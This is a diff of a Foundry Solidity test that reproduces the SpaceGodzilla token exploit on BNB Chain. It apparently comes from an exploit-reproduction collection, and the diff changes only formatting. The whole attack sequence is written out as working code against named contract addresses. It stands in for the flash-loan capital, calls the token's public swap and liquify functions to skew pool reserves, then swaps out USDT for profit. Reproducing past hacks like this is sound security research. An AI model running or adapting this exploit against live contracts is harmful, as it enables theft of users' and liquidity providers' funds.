@@ -43,11 +43,14 @@ address constant pool15 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;   // ANTEX
 address constant pool16 = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;   // DODO/WBNB Pool*/
 
 interface ISpaceGodzilla {
+
     function swapAndLiquifyStepv1() external;
     function swapTokensForOther(uint256 tokenAmount) external;
+
 }
 
 contract AttackContract is Test {
+
     using stdStorage for StdStorage;
 
     address USDT = 0x55d398326f99059fF775485246999027B3197955;
@@ -61,36 +64,26 @@ contract AttackContract is Test {
         vm.label(CakeLP, "CakeLP");
         vm.label(SpaceGodzilla, "SpaceGodzilla");
 
-        emit log_string(
-            "This reproduce shows how attacker exploit SpaceGodzilla, cause 25,378 BUSD lost"
-        );
+        emit log_string("This reproduce shows how attacker exploit SpaceGodzilla, cause 25,378 BUSD lost");
         emit log_string(
             "[Note] We skipped the part where the attacker made a flash loan with 16 pools to get the initial capital"
         );
 
         // Attacker flashloan 16 pools, to borrow 2.95 million USDT as initial capital
-        stdstore
-            .target(USDT)
-            .sig(IERC20(USDT).balanceOf.selector)
-            .with_key(address(this))
-            .checked_write(2_952_797_730_003_166_405_412_733);
+        stdstore.target(USDT).sig(IERC20(USDT).balanceOf.selector).with_key(address(this)).checked_write(
+            2_952_797_730_003_166_405_412_733
+        );
         uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
         assert(usdt_balance == 2_952_797_730_003_166_405_412_733);
     }
 
     function testExploit() public {
         uint256 init_capital = IERC20(USDT).balanceOf(address(this));
-        emit log_named_decimal_uint(
-            "[info] Attacker USDT Balance",
-            init_capital,
-            18
-        );
+        emit log_named_decimal_uint("[info] Attacker USDT Balance", init_capital, 18);
 
         // ========================================================
-        ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(
-            69_127_461_036_369_179_405_415_017_714
-        );
-        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(CakeLP).getReserves();
+        ISpaceGodzilla(SpaceGodzilla).swapTokensForOther(69_127_461_036_369_179_405_415_017_714);
+        (uint256 r0, uint256 r1,) = IUniswapV2Pair(CakeLP).getReserves();
         assert(r0 == 76_041_697_635_825_849_047_705_725_848_735);
         assert(r1 == 90_478_604_689_102_338_898_952);
         // ========================================================
@@ -105,15 +98,10 @@ contract AttackContract is Test {
         // ========================================================
         ISpaceGodzilla(SpaceGodzilla).swapAndLiquifyStepv1();
         // ========================================================
-        uint256 SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(
-            address(this)
-        ); //  71,562,167,863,336,388,351,131,715,170,010 可能會變動，因為不知道攻擊者怎麼算3％手續費
-        emit log_named_uint(
-            "address(this) SpaceGodzilla_balance",
-            SpaceGodzilla_balance
-        );
+        uint256 SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(this)); //  71,562,167,863,336,388,351,131,715,170,010 可能會變動，因為不知道攻擊者怎麼算3％手續費
+        emit log_named_uint("address(this) SpaceGodzilla_balance", SpaceGodzilla_balance);
         // ========================================================
-        (r0, r1, ) = IUniswapV2Pair(CakeLP).getReserves(); // 2,288,901,594,081,170,758,102,038,305,061     3,073,671,601,005,728,817,436,539
+        (r0, r1,) = IUniswapV2Pair(CakeLP).getReserves(); // 2,288,901,594,081,170,758,102,038,305,061     3,073,671,601,005,728,817,436,539
         assert(r1 == 3_073_671_601_005_728_817_436_539);
         // ========================================================
         suc = IERC20(USDT).transfer(CakeLP, 20_000);
@@ -122,13 +110,8 @@ contract AttackContract is Test {
         suc = IERC20(SpaceGodzilla).transfer(CakeLP, SpaceGodzilla_balance); // Transfer 所有 SpaceGodzilla 給 LP
         require(suc, "Transfer Failed");
         // ========================================================
-        uint256 LP_SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(
-            address(CakeLP)
-        );
-        emit log_named_uint(
-            "address(CakeLP) SpaceGodzilla_balance",
-            LP_SpaceGodzilla_balance
-        ); // 73,851,069,457,417,559,109,233,753,475,071 可能會變動，因為不知道攻擊者怎麼算3％手續費
+        uint256 LP_SpaceGodzilla_balance = IERC20(SpaceGodzilla).balanceOf(address(CakeLP));
+        emit log_named_uint("address(CakeLP) SpaceGodzilla_balance", LP_SpaceGodzilla_balance); // 73,851,069,457,417,559,109,233,753,475,071 可能會變動，因為不知道攻擊者怎麼算3％手續費
         // ========================================================
         uint256 amount1Out = r1 - ((r1 * 32) / 1000);
         emit log_named_uint("First swap amount1Out", amount1Out); // 2,978,176,485,325,154,862,214,560
@@ -136,23 +119,13 @@ contract AttackContract is Test {
 
         // ========================================================
         usdt_balance = IERC20(USDT).balanceOf(address(this));
-        emit log_named_decimal_uint(
-            "[info] Attacker Wallet USDT Balance",
-            usdt_balance,
-            18
-        );
+        emit log_named_decimal_uint("[info] Attacker Wallet USDT Balance", usdt_balance, 18);
 
-        require(
-            usdt_balance > init_capital,
-            "Exploit Failed, attacker take losses"
-        );
+        require(usdt_balance > init_capital, "Exploit Failed, attacker take losses");
         uint256 profit = usdt_balance - init_capital;
-        emit log_named_decimal_uint(
-            "[Profit] Attacker Wallet USDT Profit",
-            profit,
-            18
-        );
+        emit log_named_decimal_uint("[Profit] Attacker Wallet USDT Profit", profit, 18);
     }
 
     receive() external payable {}
+
 }
